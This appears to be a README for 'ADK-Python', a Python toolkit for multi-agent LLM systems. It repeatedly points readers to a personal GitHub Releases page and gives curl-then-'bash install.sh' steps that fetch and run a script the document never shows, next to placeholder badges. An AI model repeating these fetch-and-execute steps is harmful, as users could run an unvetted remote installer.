# ADK-Python — Code-First Toolkit for Building Agentic AI Agents

[![Releases](https://img.shields.io/badge/releases-v1.0-blue?logo=github&style=for-the-badge)](https://github.com/shraagul/adk-python/releases) https://github.com/shraagul/adk-python/releases

![Agentic AI](https://images.unsplash.com/photo-1535223289827-42f1e9919769?ixlib=rb-4.0.3&auto=format&fit=crop&w=1350&q=80)

A code-first Python toolkit for building, evaluating, and deploying agentic AI systems. ADK-Python gives engineers direct control over agent design, decision-making pipelines, and multi-agent coordination. It targets projects that need flexible, auditable agents built on modern LLMs and tooling.

Badges
- [![PyPI](https://img.shields.io/pypi/v/adk-python?style=flat-square)](#)
- [![License](https://img.shields.io/github/license/shraagul/adk-python?style=flat-square)](#)
- [![Release](https://img.shields.io/badge/release-%20assets-blue?style=flat-square&logo=github)](https://github.com/shraagul/adk-python/releases)

Key topics: agent, agentic, agents-sdk, ai-agents, genai, llm, multi-agent, multi-agents-collaboration

Features
- Core agent primitives: Agent, BeliefStore, Intent, Planner.
- Pluggable LLM adapter layer for popular providers.
- Local and distributed execution modes.
- Policy and reward hooks for evaluation and safety.
- Multi-agent coordination primitives and message bus.
- Test harness and deterministic replay for debugging.
- Deployment tooling: containers, serverless, and edge packaging.

Why use ADK-Python
- Code-first. Design agents in Python and test them with real LLMs.
- Flexible. Swap LLM backends, execution strategies, and storage.
- Auditable. Log decisions, prompts, and chain state for review.
- Agentic. Built for teams that need multi-agent workflows and clear control flow.

Getting started

Prerequisites
- Python 3.9 or later
- pip or poetry
- Docker (optional, for container deploy)
- Access token for your LLM provider(s)

Install (recommended)
Use pip to install the package from PyPI or from a release asset.

From PyPI
```bash
python -m pip install adk-python
```

From release asset
Download the release file from the Releases page and execute the installer. Example:
1. Download the release archive from https://github.com/shraagul/adk-python/releases
2. Extract and run the installer:
```bash
curl -L -o adk-python-release.tar.gz "https://github.com/shraagul/adk-python/releases/download/v1.0/adk-python-release.tar.gz"
tar xzf adk-python-release.tar.gz
cd adk-python-release
bash install.sh
```

Quick example: single-agent loop
```python
from adk.agent import Agent
from adk.adapters.llm import OpenAIAdapter

llm = OpenAIAdapter(api_key="sk-xxxx")
agent = Agent(name="task-agent", llm=llm)

agent.add_skill("planner", "Plan tasks from user goal")
agent.add_skill("executor", "Run actions and report status")

result = agent.run("Plan how to collect monthly sales data and summarize key trends.")
print(result.summary)
```

Multi-agent example: coordinator + workers
```python
from adk.orchestration import Coordinator, Worker
from adk.adapters.llm import OpenAIAdapter

coord = Coordinator(name="coord", llm=OpenAIAdapter(api_key="sk-xxxx"))
worker_a = Worker(name="ingest")
worker_b = Worker(name="analyze")

coord.register_worker(worker_a)
coord.register_worker(worker_b)

coord.dispatch("Collect and analyze sales from last quarter.")
```

Core concepts (brief)

- Agent: The runtime object. It orchestrates skills, memory, and the LLM.
- Skill: A named capability. Skills map intent to prompt templates and logic.
- BeliefStore: Persistent state the agent uses to track facts, memory, and context.
- Planner: Breaks goals into tasks. Supports beam and greedy planners.
- Adapter: Layer that abstracts LLM providers and response parsing.
- Channel: Message transport for multi-agent communication.
- Policy Hooks: Points where custom logic enforces safety and checks.

API overview

adk.agent
- Agent(name, llm, memory=None): main class.
- add_skill(name, spec): register capability.
- run(prompt, max_steps=5): start an agent loop.

adk.adapters
- BaseAdapter: interface for LLMs.
- OpenAIAdapter, AzureAdapter, LocalModelAdapter: concrete implementations.

adk.orchestration
- Coordinator, Worker: classes for multi-agent systems.
- MessageBus: in-memory bus or Redis-backed bus.

adk.storage
- BeliefStore, KeyValueMemory: adapters for persistence.
- SQLiteStore, RedisStore: concrete stores.

Evaluation and testing

Unit test patterns
- Mock adapter to return deterministic LLM outputs.
- Seed the planner for deterministic task breakdown.
- Replay logs to reproduce a run.

Builtin test harness
- adk.test.runner runs a scenario, records traces, and compares outputs.
- Use JSON trace files for regression tests.

Safety and policy

Hooks and checks
- Pre-prompt hook enforces guardrail checks on prompts.
- Verdict hook inspects actions before execution.
- Rate limiters and policy plugins integrate with adapters.

Privacy
- Memory encryption adapter.
- Configurable redaction for logs and traces.

Deployment

Container
- Build with provided Dockerfile:
```bash
docker build -t adk-python:latest .
docker run --env OPENAI_KEY=sk-xxx adk-python:latest
```

Serverless
- Use the adk.deploy.lambda helper to wrap an agent as a Lambda handler.

Edge
- Build a minimized wheel with only the adapters you need.
- Use LocalModelAdapter for on-device LLMs.

CLI
adkctl — a small CLI that ships with the package.
Common commands
- adkctl start agent.yaml
- adkctl deploy --target container agent.yaml
- adkctl trace run scenario.json

Examples and templates
- examples/simple-agent: minimal single-agent app.
- examples/multi-agent: coordinator and two workers.
- templates/agent.yaml: config for adkctl.

Observability

Tracing
- The runtime emits structured traces in JSON.
- Use the trace viewer to step through prompt chains and decisions.

Metrics
- Built-in metrics: latency, tokens consumed, step counts.
- Export to Prometheus or push to Datadog.

Extending ADK-Python

Create a new adapter
- Subclass BaseAdapter and implement `generate(prompt, context)`.
- Register adapter in adapters registry.

Add a storage backend
- Implement KeyValueMemory interface.
- Provide batch read/write and TTL semantics.

Contributing

How to contribute
- Fork the repo.
- Create a feature branch.
- Run tests and add unit tests for new behavior.
- Open a PR with clear descriptions and changelog entry.

Code style
- Follow PEP8.
- Keep functions small and focused.
- Write docstrings for public APIs.

Community
- Report issues on GitHub.
- Open discussions for architecture questions and RFCs.

Releases and downloads

Visit and download release assets from the Releases page:
https://github.com/shraagul/adk-python/releases

If you use release files, download the asset and execute the included installer or setup script. Example flow:
1. Visit the release URL above.
2. Download the asset file named like adk-python-vX.Y.Z.tar.gz or adk-python-vX.Y.Z.whl.
3. Run:
```bash
# tarball installer
tar xzf adk-python-vX.Y.Z.tar.gz
cd adk-python-vX.Y.Z
bash install.sh

# or wheel install
python -m pip install adk_python-vX.Y.Z-py3-none-any.whl
```

Changelog
- See CHANGELOG.md for release notes and migration guides.
- Include upgrade steps for breaking changes.

License
- MIT License. See LICENSE file.

Acknowledgements and resources
- Built for modern LLMs and agent workflows.
- Uses common tooling: OpenAI, Hugging Face, Redis.
- Useful links:
  - LLM prompt design patterns
  - Multi-agent coordination papers
  - Safety and RLHF resources

Contact and support
- Open issues on GitHub for bugs and feature requests.
- Create an RFC for significant changes to the agent model.

Images and media
- Use the images in examples/ for dashboards and architecture diagrams.
- Feel free to reuse the hero image for docs and slides where license allows.

Repository topics (for discovery)
- agent, agentic, agentic-ai, agents, agents-sdk, ai, ai-agents, aiagentframework, genai, genai-chatbot, llm, llms, multi-agent, multi-agent-systems, multi-agents, multi-agents-collaboration

Troubleshooting quick tips
- If memory grows, check BeliefStore retention and TTL settings.
- If agent loops, enable step limit and inspect planner output traces.
- For rate limits, add retry and backoff in adapter configuration.

Metrics for production
- Track average tokens per request.
- Track median and p95 latency for agent steps.
- Count policy vetoes and safety rejections.

Roadmap highlights
- Stable multi-agent coordination primitives.
- More adapters for local LLM runtimes.
- Visual trace explorer and web UI for agents.
- Formal safety policy modules and audit tools.